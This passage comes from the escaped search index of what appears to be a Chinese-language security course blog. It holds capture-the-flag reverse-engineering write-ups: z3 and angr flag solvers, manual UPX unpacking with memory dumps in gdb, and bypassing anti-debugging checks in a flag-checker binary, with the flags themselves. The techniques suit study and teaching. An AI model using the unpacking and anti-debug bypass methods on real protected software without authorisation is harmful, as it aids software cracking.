[(\u0026#39;add\u0026#39;, 29375), (\u0026#39;sub\u0026#39;, 419), (\u0026#39;add\u0026#39;, 2854), (\u0026#39;sub\u0026#39;, 11878), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 40151)], [(\u0026#39;add\u0026#39;, 22953)]] targets = [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078] flag_len = 43 # 起手式 - 開一個Solver s = Solver() # 建立符號 - 以此lab來說就是建立43個符號對應每一個flag字元 bvs = [BitVec(f\u0026#39;bt_{i}\u0026#39;, 32) for i in range(flag_len)] # 加上constraint - 以此lab來說每一個flag字元都應該限制在空白到0x7f之間 for bv in bvs: s.add(And(bv \u0026gt;= 0x20, bv \u0026lt;= 0x7f)) for i, patter in enumerate(patters): formula = f\u0026#39;bvs[{i}]\u0026#39; for step in patter: op = step[0] value = step[1] if op == \u0026#39;add\u0026#39;: formula = f\u0026#39;({formula} + {value})\u0026#39; elif op == \u0026#39;sub\u0026#39;: formula = f\u0026#39;({formula} - {value})\u0026#39; elif op == \u0026#39;lsh\u0026#39;: formula = f\u0026#39;({formula} \u0026lt;\u0026lt; {value})\u0026#39; print(f\u0026#39;{formula} == {targets[i]}\u0026#39;) s.add(eval(formula) == targets[i]) # 如果有解的話就會做以下操作 if s.check() == sat: print(\u0026#39;Find ~~~\u0026#39;) print(s.model()) flag = \u0026#34;\u0026#34; for bv in bvs: flag += chr(s.model()[bv].as_long()) print(flag) "},{"id":418,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/","title":"Simple Reverse - 0x28(2023 Lab - Super Angry)","section":"Securities","content":" Simple Reverse - 0x28(2023 Lab - Super Angry) # Source code # :::spoiler main function\n__int64 __fastcall main(int argc, char **argv, char **a3) { __int64 *user_input; // rcx __int64 v5; // rdx __int64 v6; // rdx char output[128]; // [rsp+10h] [rbp-B0h] BYREF __int64 user_input_cp[6]; // [rsp+90h] [rbp-30h] BYREF user_input_cp[5] = __readfsqword(0x28u); if ( argc == 2 ) { user_input = (__int64 *)argv[1]; v5 = user_input[1]; user_input_cp[0] = *user_input; user_input_cp[1] = v5; v6 = user_input[3]; user_input_cp[2] = user_input[2]; user_input_cp[3] = v6; scramble_fn((__int64)user_input_cp, output, 0x20uLL); if ( !memcmp(output, verify_key, 0x80uLL) ) puts(\u0026#34;Correct!\u0026#34;); else puts(\u0026#34;Incorrect!\u0026#34;); return 0LL; } else { printf(\u0026#34;Usage: %s \u0026lt;input\u0026gt;\\n\u0026#34;, *argv); return 1LL; } } :::\n:::spoiler scramble function\nunsigned __int64 __fastcall scramble_fn(char *user_input, uint32_t *output, unsigned __int64 const_0x20) { unsigned __int64 result; // rax int cmd; // [rsp+24h] [rbp-Ch] unsigned __int64 i; // [rsp+28h] [rbp-8h] cmd = 1; memset(output, 0, 4 * const_0x20); // 從這邊可以看得出來output的大小應該是int或是uint，因為有4 bytes for ( i = 0LL; ; ++i ) { result = i; if ( i \u0026gt;= const_0x20 ) break; switch ( cmd ) { case 1: output[i] = (user_input[i] \u0026lt;\u0026lt; 12) + 5308892; cmd = 3; break; case 2: output[i] = 4 * (user_input[i] + 1958409); cmd = 4; break; case 3: output[i] = user_input[i] + 192731; cmd = 5; break; case 4: output[i] = 4 * user_input[i] + 14474785; cmd = 1; break; case 5: output[i] = (user_input[i] \u0026lt;\u0026lt; 17) + 176044; cmd = 6; break; case 6: output[i] = user_input[i] - 3874948; cmd = 2; break; default: continue; } } return result; } :::\nRecon # 可以從IDA解析出來的結果得知，這支程式的主要流程是我們執行的時候command多帶一個參數，而這個參數會直接進到scramble_fn做一些操作，最後會再跟verify_key進行memcmp，大略分析一下scramble_fn後發先他是一個偏簡單但我們懶得看得操作，所以可以試看看用angr解看看\nangr基本流程:\n建立一個project 建立claripy symbol - 以這個lab的例子來說就是建立我們輸入進去的程式的input string 建立初始的state - 以這個lab來說就是我們一開始輸入的input string 有了proj / symbol / initial state之後就要開始讓他跑起來 Exploit # import angr import claripy # 建立一個project root = \u0026#39;Reverse/Lab3/Super Angry/\u0026#39; proj = angr.Project(root + \u0026#39;super_angry\u0026#39;) # 建立Claripy Symbol sym_arg = claripy.BVS(\u0026#39;sym_arg\u0026#39;, 8 * 32) # 就像z3一樣要建立symbol # 建立初始的state state = proj.factory.entry_state(args=[proj.filename, sym_arg]) simgr = proj.factory.simulation_manager(state) # 有了proj/symbol/initial state之後就要開始讓他跑起來 simgr.explore(find = lambda s: b\u0026#39;Correct!\u0026#39; in s.posix.dumps(1)) if len(simgr.found) \u0026gt; 0: print(simgr.found[0].solver.eval(sym_arg, cast_to=bytes)) else: print(\u0026#34;NONONONO\u0026#34;) # b\u0026#39;FLAG{knowing_how_2_angr!}\\x00DBUS_S\u0026#39; Flag: FLAG{knowing_how_2_angr!}\n"},{"id":419,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/","title":"Simple Reverse - 0x29(2023 Lab - Unpackme)","section":"Securities","content":" Simple Reverse - 0x29(2023 Lab - Unpackme) # Source code # ... LOAD:0000000000005AE8 mov rdi, [rsp+18h+start] ; start LOAD:0000000000005AED push 5 LOAD:0000000000005AEF pop rdx ; prot LOAD:0000000000005AF0 push 0Ah LOAD:0000000000005AF2 pop rax LOAD:0000000000005AF3 syscall ; LINUX - sys_mprotect LOAD:0000000000005AF5 jmp r13 LOAD:0000000000005AF5 LOAD:0000000000005AF5 sub_5A7C endp LOAD:0000000000005AF5 LOAD:0000000000005AF8 ; --------------------------------------------------------------------------- LOAD:0000000000005AF8 LOAD:0000000000005AF8 loc_5AF8: ; CODE XREF: start+2↑p LOAD:0000000000005AF8 pop rbp LOAD:0000000000005AF9 call sub_5A7C LOAD:0000000000005AF9 LOAD:0000000000005AF9 ; --------------------------------------------------------------------------- LOAD:0000000000005AFE aProcSelfExe db \u0026#39;/proc/self/exe\u0026#39;,0 LOAD:0000000000005B0D align 2 LOAD:0000000000005B0E dw 1 LOAD:0000000000005B10 dq 81B00000C1100h, 0FFFFFF0000000200h, 7549F983004AE8E5h, 0FD374C8D48575344h, 0CE39482FEB5B565Eh, 0FFFFFBFF5E563273h LOAD:0000000000005B10 dq 778F3C0A72803CACh, 2C06740FFE7E8006h, 56161BE477013CE8h, 0FFBFFFFF75D028ADh, 0D801F829C80F5FDFh, 0C35BDFEBAC0312ABh LOAD:0000000000005B10 dq 8948505741564158h, 0DBFFEDFEEC8148E6h, 590A6A5F54591000h, 5003E8348A548F3h, 0B6AB48FE8949F875h, 0F60C0AFC0CCBB374h LOAD:0000000000005B10 dq 4DF5FF6EDFFE02FFh, 5E57370FFFBAFC29h, 50F58596AED7B8Ch, 0DFFF6FDB0579C085h, 8D49FD91580F6A0Eh, 0E741AAA00B0FF7Dh ... :::spoiler Real File main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax unsigned __int64 i; // [rsp+8h] [rbp-58h] char user_input[32]; // [rsp+10h] [rbp-50h] BYREF char v6[40]; // [rsp+30h] [rbp-30h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\u0026#34;Enter input: \u0026#34;); scanf(\u0026#34;%s\u0026#34;, user_input); if ( sub_10C0(user_input, qword_4018, 10LL) ) { printf_0(\u0026#34;Incorrect!\u0026#34;); result = 1; } else { for ( i = 0LL; i \u0026lt;= 0x26; ++i ) v6[i] = user_input[i % 0xA] ^ *(qword_4010 + i); printf(\u0026#34;%s\u0026#34;); result = 0; } if ( v7 != __readfsqword(0x28u) ) return sub_10A0(); return result; } :::\nRecon # 這一題一開始就知道是UPX加殼，但是直接試了upx幫忙decompress，卻遇到error，代表可能有一些問題(在Unix環境底下?)，所以我嘗試使用手動脫殼，去分析其中的內容\n首先可以先靜態看一下脫完殼之前是在哪邊跳轉，經過實測和判斷，應該是:\nLOAD:0000000000005AF5 jmp r13 :::info 如何在動態取得這一行的位置呢?手動算出rebase address\n首先先用靜態分析看starti的時候的offset 開始動態執行程式 把目前指到的address拿去和靜態分析拿到的offset相減 (optional)可以用vmmap確認一下 再把我們想要得知的那一行的offset加回來 一開始的offset是0x5888\ngef➤ starti gef➤ x/x 0x7ffff7ffd888-0x5888 0x7ffff7ff8000: 0x7f gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00007ffff7ff2000 0x00007ffff7ff6000 0x0000000000000000 r-- [vvar] 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 r-x [vdso] 0x00007ffff7ff8000 0x00007ffff7ff9000 0x0000000000000000 rw- /mnt/d/NTU/Second Year/Computer Security/Reverse/Lab3/Unpackme/unpackme 0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 rw- 0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x /mnt/d/NTU/Second Year/Computer Security/Reverse/Lab3/Unpackme/unpackme 0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack] gef➤ x/10i 0x7ffff7ff8000+0x5AF5 0x7ffff7ffdaf5: jmp r13 0x7ffff7ffdaf8: pop rbp 0x7ffff7ffdaf9: call 0x7ffff7ffda7c 0x7ffff7ffdafe: (bad) 0x7ffff7ffdaff: jo 0x7ffff7ffdb73 0x7ffff7ffdb01: outs dx,DWORD PTR ds:[rsi] 0x7ffff7ffdb02: movsxd ebp,DWORD PTR [rdi] 0x7ffff7ffdb04: jae 0x7ffff7ffdb6b 0x7ffff7ffdb06: ins BYTE PTR es:[rdi],dx 0x7ffff7ffdb07: data16 (bad) :::\n利用動態看r13的address會跳去哪邊$\\to$0x00007ffff7ff1000\n接下來我找不太到分析的地方，所以就直接c(continue)到user input的地方停下來，再看vmmap :::spoiler vmmap\n[ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00007ffff7d84000 0x00007ffff7d87000 0x0000000000000000 rw- 0x00007ffff7d87000 0x00007ffff7daf000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7daf000 0x00007ffff7f44000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7f44000 0x00007ffff7f9c000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7f9c000 0x00007ffff7fa0000 0x0000000000214000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7fa0000 0x00007ffff7fa2000 0x0000000000218000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7fa2000 0x00007ffff7faf000 0x0000000000000000 rw- 0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000000000 rw- 0x00007ffff7fb5000 0x00007ffff7fb7000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fb7000 0x00007ffff7fe1000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fe1000 0x00007ffff7fec000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fec000 0x00007ffff7fed000 0x0000000000000000 --- 0x00007ffff7fed000 0x00007ffff7fef000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fef000 0x00007ffff7ff1000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7ff2000 0x00007ffff7ff6000 0x0000000000000000 r-- [vvar] 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 r-x [vdso] 0x00007ffff7ff8000 0x00007ffff7ff9000 0x0000000000000000 r-- 0x00007ffff7ff9000 0x00007ffff7ffa000 0x0000000000000000 r-x 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-- 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000000000 rw- 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 r-- /mnt/d/NTU/Second Year/Computer Security/Reverse/Lab3/Unpackme/unpackme 0x00007ffff7fff000 0x00007ffff8020000 0x0000000000000000 rw- [heap] 0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack] ::: 可以看到0x00007ffff7ff8000開始會有ELF的字樣，代表應該是他脫殼完的結果，我的作法是直接把0x00007ffff7ff8000~0x00007ffff7ffd000全部dump下來進行分析\ngef➤ x/s 0x00007ffff7ff8000 0x7ffff7ff8000: \u0026#34;\\177ELF\\002\\001\\001\u0026#34; gef➤ dump memory real_file 0x00007ffff7ff8000 0x00007ffff7ffd000 開始分析real_file，先用靜態看一下(如source code所示) 找到我們要停的地方的offset$\\to$0x1213\ngef➤ x/10i 0x00007ffff7ff8000+0x1213 0x7ffff7ff9213: mov rcx,QWORD PTR [rip+0x2dfe] # 0x7ffff7ffc018 0x7ffff7ff921a: lea rax,[rbp-0x50] 0x7ffff7ff921e: mov edx,0xa 0x7ffff7ff9223: mov rsi,rcx 0x7ffff7ff9226: mov rdi,rax =\u0026gt; 0x7ffff7ff9229: call 0x7ffff7ff90c0 0x7ffff7ff922e: test eax,eax 0x7ffff7ff9230: je 0x7ffff7ff924b 0x7ffff7ff9232: lea rax,[rip+0xe13] # 0x7ffff7ffa04c 0x7ffff7ff9239: mov rdi,rax 可以看到解析出來的assembly和IDA的差不多，代表我們找對地方\n設定breakpoint後continue就可以在stack中看到key\ngef➤ b *(0x00007ffff7ff9000+0x229) Breakpoint 1 at 0x7ffff7ff9229 gef➤ c Continuing. adjfl Breakpoint 1, 0x00007ffff7ff9229 in ?? () 0x7ffff7ff90c0 ( $rdi = 0x00007fffffffd6c0 → 0x0000006c666a6461 (\u0026#34;adjfl\u0026#34;?), $rsi = 0x00007ffff7ffa030 → \u0026#34;just_a_key\u0026#34;, $rdx = 0x000000000000000a, $rcx = 0x00007ffff7ffa030 → \u0026#34;just_a_key\u0026#34; ) Exploit # key: just_a_key\n$ ./unpackme Enter input: just_a_key FLAG{just_4_simple_unpackme_challenge!} Flag: FLAG{just_4_simple_unpackme_challenge!}\n"},{"id":420,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/","title":"Simple Reverse - 0x30(2023 HW - Evil FlagChecker)","section":"Securities","content":" Simple Reverse - 0x30(2023 HW - Evil FlagChecker) # Background # Anti Disassembly - 這一部分可以看一下碩一修的malware reverse的anti disassembly的修復(就是d和c的交錯使用) Anti Debugging - 首推scylla hide\nSource code # :::spoiler IDA main\nint __cdecl main(int argc, const char **argv, const char **envp) { DWORD TickCount; // [esp+0h] [ebp-14h] unsigned int v5; // [esp+8h] [ebp-Ch] TickCount = GetTickCount(); Sleep(120000u); v5 = GetTickCount() - TickCount; if ( v5 \u0026lt; 119950 || v5 \u0026gt; 120050 ) ExitProcess(0); ((void (*)(void))loc_401AE0)(); return 0; } ::: :::spoiler IDA loc_401AE0\n.text:00401AE0 loc_401AE0: ; CODE XREF: _main:loc_4014AB↑p .text:00401AE0 push ebp .text:00401AE1 mov ebp, esp .text:00401AE3 lea esi, aHelloHacker ; \u0026#34;Hello Hacker\u0026#34; .text:00401AE9 mov al, 48h ; \u0026#39;H\u0026#39; .text:00401AEB cmp [esi], al .text:00401AED jz short loc_401AF0 .text:00401AED .text:00401AED ; --------------------------------------------------------------------------- .text:00401AEF db 0E8h .text:00401AF0 ; --------------------------------------------------------------------------- .text:00401AF0 .text:00401AF0 loc_401AF0: ; CODE XREF: .text:00401AED↑j .text:00401AF0 nop word ptr [eax+eax+00000000h] .text:00401AF9 jmp short loc_401B01 .text:00401AF9 .text:00401AF9 ; --------------------------------------------------------------------------- .text:00401AFB db 48h ; H .text:00401AFC db 65h ; e .text:00401AFD db 6Ch ; l .text:00401AFE db 6Ch ; l .text:00401AFF db 6Fh ; o .text:00401B00 db 0 .text:00401B01 ; --------------------------------------------------------------------------- .text:00401B01 .text:00401B01 loc_401B01: ; CODE XREF: .text:00401AF9↑j .text:00401B01 jmp short loc_401B0E .text:00401B01 .text:00401B01 ; --------------------------------------------------------------------------- .text:00401B03 db 0E8h .text:00401B04 db 66h ; f .text:00401B05 db 0Fh .text:00401B06 db 1Fh .text:00401B07 db 84h .text:00401B08 db 0 .text:00401B09 db 0 .text:00401B0A db 0 .text:00401B0B db 0 .text:00401B0C byte_401B0C db 0 .text:00401B0D db 0E8h .text:00401B0E ; --------------------------------------------------------------------------- .text:00401B0E .text:00401B0E loc_401B0E: ; CODE XREF: .text:loc_401B01↑j .text:00401B0E jz short loc_401B13 .text:00401B0E .text:00401B10 jnz short loc_401B13 .text:00401B10 .text:00401B10 ; --------------------------------------------------------------------------- .text:00401B12 db 0E8h .text:00401B13 ; --------------------------------------------------------------------------- .text:00401B13 .text:00401B13 loc_401B13: ; CODE XREF: .text:loc_401B0E↑j .text:00401B13 ; .text:00401B10↑j .text:00401B13 push 1 .text:00401B15 jmp sub_401220 ::: :::spoiler IDA notify_debugger\nvoid __cdecl __noreturn notify_debugger() { if ( IsDebuggerPresent() ) ExitProcess(1u); __debugbreak(); } ::: :::spoiler IDA sub_401220\n.text:00401220 sub_401220 proc near ; CODE XREF: .text:00401B15↓j .text:00401220 .text:00401220 ms_exc= CPPEH_RECORD ptr -18h .text:00401220 .text:00401220 push ebp .text:00401221 mov ebp, esp .text:00401223 push 0FFFFFFFEh .text:00401225 push offset stru_403B40 .text:0040122A push offset ?notify_debugger@@YAXABUtagEXCEPTION_VISUALCPP_DEBUG_INFO@@@Z_SEH .text:0040122F mov eax, large fs:0 .text:00401235 push eax .text:00401236 sub esp, 8 .text:00401239 push ebx .text:0040123A push esi .text:0040123B push edi .text:0040123C mov eax, ___security_cookie .text:00401241 xor [ebp+ms_exc.registration.ScopeTable], eax .text:00401244 xor eax, ebp .text:00401246 push eax .text:00401247 lea eax, [ebp+ms_exc.registration] .text:0040124A mov large fs:0, eax .text:00401250 mov [ebp+ms_exc.old_esp], esp .text:00401253 mov [ebp+ms_exc.registration.TryLevel], 0 .text:0040125A call sub_401170 .text:0040125A .text:0040125F ; --------------------------------------------------------------------------- .text:0040125F test al, al .text:00401261 jz short loc_40126B .text:00401261 .text:00401263 push 1 ; uExitCode .text:00401265 call ds:ExitProcess .text:00401265 .text:0040126B ; --------------------------------------------------------------------------- .text:0040126B .text:0040126B loc_40126B: ; CODE XREF: sub_401220+41↑j .text:0040126B int 3 ; Trap to Debugger .text:0040126B .text:0040126C ; --------------------------------------------------------------------------- .text:0040126C jmp short loc_40127C .text:0040126C .text:0040126E ; --------------------------------------------------------------------------- .text:0040126E .text:0040126E loc_40126E: ; DATA XREF: .rdata:stru_403B40↓o .text:0040126E mov eax, 1 .text:00401273 retn .text:00401273 .text:00401274 ; --------------------------------------------------------------------------- .text:00401274 .text:00401274 loc_401274: ; DATA XREF: .rdata:stru_403B40↓o .text:00401274 mov esp, [ebp+ms_exc.old_esp] .text:00401277 call ?notify_debugger@@YAXABUtagEXCEPTION_VISUALCPP_DEBUG_INFO@@@Z ; notify_debugger(tagEXCEPTION_VISUALCPP_DEBUG_INFO const \u0026amp;) .text:00401277 .text:0040127C ; --------------------------------------------------------------------------- .text:0040127C .text:0040127C loc_40127C: ; CODE XREF: sub_401220+4C↑j .text:0040127C mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh .text:00401283 mov ecx, [ebp+ms_exc.registration.Next] .text:00401286 mov large fs:0, ecx .text:0040128D pop ecx .text:0040128E pop edi .text:0040128F pop esi .text:00401290 pop ebx .text:00401291 mov esp, ebp .text:00401293 pop ebp .text:00401294 retn .text:00401294 .text:00401294 sub_401220 endp ::: :::spoiler IDA sub_401170\n.text:00401170 sub_401170 proc near ; CODE XREF: sub_401220+3A↓p .text:00401170 .text:00401170 var_1= byte ptr -1 .text:00401170 .text:00401170 push ebp .text:00401171 mov ebp, esp .text:00401173 push ecx .text:00401174 mov [ebp+var_1], 1 .text:00401178 push offset TopLevelExceptionFilter ; lpTopLevelExceptionFilter .text:0040117D call ds:SetUnhandledExceptionFilter .text:0040117D .text:00401183 ; --------------------------------------------------------------------------- .text:00401183 int 3 ; Trap to Debugger .text:00401183 .text:00401183 sub_401170 endp .text:00401183 .text:00401184 ; --------------------------------------------------------------------------- .text:00401184 jmp short loc_40118A .text:00401184 .text:00401186 ; --------------------------------------------------------------------------- .text:00401186 mov byte ptr [ebp-1], 0 .text:00401186 .text:0040118A .text:0040118A loc_40118A: ; CODE XREF: .text:00401184↑j .text:0040118A mov al, [ebp-1] .text:0040118D mov esp, ebp .text:0040118F pop ebp .text:00401190 retn .text:00401190 .text:00401190 ; --------------------------------------------------------------------------- .text:00401191 align 10h .text:004011A0 .text:004011A0 ; =============== S U B R O U T I N E ======================================= .text:004011A0 .text:004011A0 ; Attributes: library function noreturn static bp-based frame .text:004011A0 .text:004011A0 ; void __cdecl __noreturn notify_debugger() .text:004011A0 ?notify_debugger@@YAXABUtagEXCEPTION_VISUALCPP_DEBUG_INFO@@@Z proc near .text:004011A0 ; CODE XREF: sub_401220+57↓p .text:004011A0 .text:004011A0 ms_exc= CPPEH_RECORD ptr -18h .text:004011A0 .text:004011A0 ; FUNCTION CHUNK AT .text:00401206 SIZE 0000000E BYTES .text:004011A0 .text:004011A0 push ebp .text:004011A1 mov ebp, esp .text:004011A3 push 0FFFFFFFEh .text:004011A5 push offset stru_403B20 .text:004011AA push offset ?notify_debugger@@YAXABUtagEXCEPTION_VISUALCPP_DEBUG_INFO@@@Z_SEH .text:004011AF mov eax, large fs:0 .text:004011B5 push eax .text:004011B6 sub esp, 8 .text:004011B9 push ebx .text:004011BA push esi .text:004011BB push edi .text:004011BC mov eax, ___security_cookie .text:004011C1 xor [ebp+ms_exc.registration.ScopeTable], eax .text:004011C4 xor eax, ebp .text:004011C6 push eax .text:004011C7 lea eax, [ebp+ms_exc.registration] .text:004011CA mov large fs:0, eax .text:004011D0 mov [ebp+ms_exc.old_esp], esp .text:004011D3 mov [ebp+ms_exc.registration.TryLevel], 0 .text:004011DA call ds:IsDebuggerPresent .text:004011DA .text:004011E0 test eax, eax .text:004011E2 jz short loc_4011EC .text:004011E2 .text:004011E4 push 1 ; uExitCode .text:004011E6 call ds:ExitProcess .text:004011E6 .text:004011EC ; --------------------------------------------------------------------------- .text:004011EC .text:004011EC loc_4011EC: ; CODE XREF: notify_debugger(tagEXCEPTION_VISUALCPP_DEBUG_INFO const \u0026amp;)+42↑j .text:004011EC int 3 ; Trap to Debugger .text:004011EC .text:004011EC ?notify_debugger@@YAXABUtagEXCEPTION_VISUALCPP_DEBUG_INFO@@@Z endp .text:004011EC .text:004011ED ; --------------------------------------------------------------------------- .text:004011ED mov dword ptr [ebp-4], 0FFFFFFFEh .text:004011F4 mov ecx, [ebp-10h] .text:004011F7 mov large fs:0, ecx .text:004011FE pop ecx .text:004011FF pop edi .text:00401200 pop esi .text:00401201 pop ebx .text:00401202 mov esp, ebp .text:00401204 pop ebp .text:00401205 retn .text:00401205 .text:00401206 ; --------------------------------------------------------------------------- .text:00401206 ; START OF FUNCTION CHUNK FOR notify_debugger(tagEXCEPTION_VISUALCPP_DEBUG_INFO const \u0026amp;) .text:00401206 .text:00401206 loc_401206: ; DATA XREF: .rdata:stru_403B20↓o .text:00401206 mov eax, 1 .text:0040120B retn .text:0040120B .text:0040120C ; --------------------------------------------------------------------------- .text:0040120C .text:0040120C loc_40120C: ; DATA XREF: .rdata:stru_403B20↓o .text:0040120C mov esp, [ebp+ms_exc.old_esp] .text:0040120F call InputFlag_Check ::: :::spoiler IDA InputFlag_Check\nvoid __noreturn InputFlag_Check() { flag_info flag_info; // [esp+0h] [ebp-408h] BYREF printf(flag_info.Hello, flag_info.nonono); memset(\u0026amp;flag_info, 0, sizeof(flag_info)); scanf(std::cin, (int)\u0026amp;flag_info); check((int)\u0026amp;flag_info, strlen((const char *)\u0026amp;flag_info)); printf(flag_info.Hello, flag_info.nonono); ExitProcess(0); } ::: :::spoiler IDA check\nvoid __fastcall check(char *input, unsigned int len) { unsigned int iv; // ebx unsigned int block; // edi int mem_addr_gap; // ecx unsigned __int8 cipher; // cl char *input_cipher_cp; // ecx char *cipher_flag_cp; // edx bool v9; // cf unsigned int i; // esi int dot; // [esp+0h] [ebp-41Ch] int new_line; // [esp+4h] [ebp-418h] int mem_addr_gap_cp; // [esp+Ch] [ebp-410h] char output[1028]; // [esp+10h] [ebp-40Ch] BYREF iv = 0xE0C92EAB; memset(output, 0, 0x400u); block = 0; if ( len ) { mem_addr_gap = input - output; // v5代表我們輸入的flag的位址和他memset的位址的差距，從這支檔案為例就是0x418 mem_addr_gap_cp = input - output; do { cipher = iv ^ output[block + mem_addr_gap]; output[block] = cipher; iv = len + (cipher ^ __ROR4__(iv, 3)) - block; Sleep(1000u); printf(dot, new_line); mem_addr_gap = mem_addr_gap_cp; ++block; } while ( block \u0026lt; len ); } printf(dot, new_line); input_cipher_cp = output; cipher_flag_cp = cipher_flag; v9 = len \u0026lt; 4; for ( i = len - 4; !v9; i -= 4 ) { if ( *(_DWORD *)input_cipher_cp != *(_DWORD *)cipher_flag_cp ) break; input_cipher_cp += 4; cipher_flag_cp += 4; v9 = i \u0026lt; 4; } } :::\nRecon # 這一題沒有那麼難，難的是怎麼用工具寫出來，本來想要直接用z3或angr直接噴出來，但是不知道為啥就完全沒有奇蹟發生，所以還是硬幹\n首先，先用ida看主要的流程，會發現有很多jmp系列的位址都跑掉了，此時就要修復，就是data(d)和code( c)之間交錯使用，並且把那些奇怪的data byte換成nop，修把patch好的部分，就會呈現上面的source code這樣\n一樣由上而下，首先會先進到sleep睡眠兩分鐘，並且判斷進到下一行的時候，時間是否在範圍內，這也是time based的anti debugging手法，這部分可以動態直接patch掉 :::spoiler Patch Sleep Function Result ::: 接著會進到loc_401AE0，這部分應該是一個function但不知道為甚麼IDA翻譯不出來，不過看了一下source code也是蠻簡單的，就是一直跳到==sub_401220==，這個在動態也可以patch :::spoiler Patch Anti-Debug Result ::: ==sub_401220==主要是在其他anti debug的部分，具體怎麼做不是很清楚，只知道大概是和exception handler有關係，不過我在開了scylla hide之後沒有出現甚麼特別的事情 接著會進到==sub_401170==，這一段蠻重要的，就是處理一些Exception Handler的事情，然後莫名其妙的會進到0x40120F中的==InputFlag_Check==，中間的一些操作可能是被scylla hide擋掉了，不過中間也確實有檢察==IsDebuggerPresent==這東西 到了這邊就可以大膽猜測一些常見的操作，諸如scanf或是printf的function，接著我們會進到check這個function，也就是實際把我們的輸入，進行cipher操作後和內部的data bytes進行對比的過程 所以到了這邊一切都很明瞭了，主要的code如下 iv = 0xE0C92EAB; memset(output, 0, 0x400u); block = 0; if ( len ) { mem_addr_gap = input - output; // v5代表我們輸入的flag的位址和他memset的位址的差距，從這支檔案為例就是0x418 mem_addr_gap_cp = input - output; do { cipher = iv ^ output[block + mem_addr_gap]; output[block] = cipher; iv = len + (cipher ^ __ROR4__(iv, 3)) - block; Sleep(1000u); printf(dot, new_line); mem_addr_gap = mem_addr_gap_cp; ++block; } while ( block \u0026lt; len ); } 其中，output[block + mem_addr_gap]其實就是我們的input，所以exploit的邏輯就是用brute force，把所有可能都丟一遍，然後嘗試去對比有沒有和built-in cipher bytes一樣，BTW，len代表我們輸入的長度，合理猜測和built-in cipher bytes的長度一樣，也就是23個char，中間的sleep在動態也可以patch掉，就看自己方便 :::danger 在寫ROR的實作時有一個非常重要的重點要注意，也就是最後一個右旋的bit如果是0，在下一次右旋時會被忽略，也就是那個bit會消失，被當成0x的一部分，舉例來說，0x111001，右旋兩次後變成0x011110，但是最左邊的0會被當成0x的一部分，所以下一次再右旋兩次的結果會變成0x10111而不是0x100111，所以我的作法是在每次右旋之前都檢查bit length是不是都是32 bits，如果有少就padding 0在最左邊 ::: Exploit # 另外說明一下，z3或angr的解法都沒辦法實作出來，不確定是甚麼原因，但有機會還是會想解看看，所以先放著看看\nfrom string import * from tqdm import trange def ror(n, rotations, width): if rotations.bit_length() \u0026lt; 32: rotations = \u0026#39;0\u0026#39; * (32 - rotations.bit_length()) + bin(rotations)[2:] tmp = rotations[-width:] + rotations[:-width] return int(tmp, 2) tmp = int(bin(rotations \u0026lt;\u0026lt; (n-width))[-n:-n+width] + bin(rotations \u0026gt;\u0026gt; width)[2:], 2) return tmp candidates = printable targets = [0xED, 0x03, 0x81, 0x69, 0x7B, 0x84, 0xA6, 0xA0, 0x5B, 0x2B, 0xB6, 0xE6, 0x5C, 0x57, 0xC9, 0x99, 0xE8, 0xB2, 0x20, 0x72, 0x38, 0xF1, 0x58] len = len(targets) iv = 0xE0C92EAB flag = \u0026#39;\u0026#39; for byte in trange(len): iv_xor = int(hex(iv)[2:][-2:], 16) for candidate in candidates: cipher = iv_xor ^ ord(candidate) if cipher == targets[byte]: flag += candidate iv = ror(32, iv, 3) iv = len + (cipher ^ iv) - byte break # print(flag) print(flag) :::spoiler z3 solver\nfrom z3 import * target = [0xED, 0x03, 0x81, 0x69, 0x7B, 0x84, 0xA6, 0xA0, 0x5B, 0x2B, 0xB6, 0xE6, 0x5C, 0x57, 0xC9, 0x99, 0xE8, 0xB2, 0x20, 0x72, 0x38, 0xF1, 0x58] len = len(target) iv = 0xE0C92EAB # 起手式 - 開一個Solver s = Solver() # 建立符號 - 以此HW來說就是建立23個符號對應每一個flag字元 bvs = 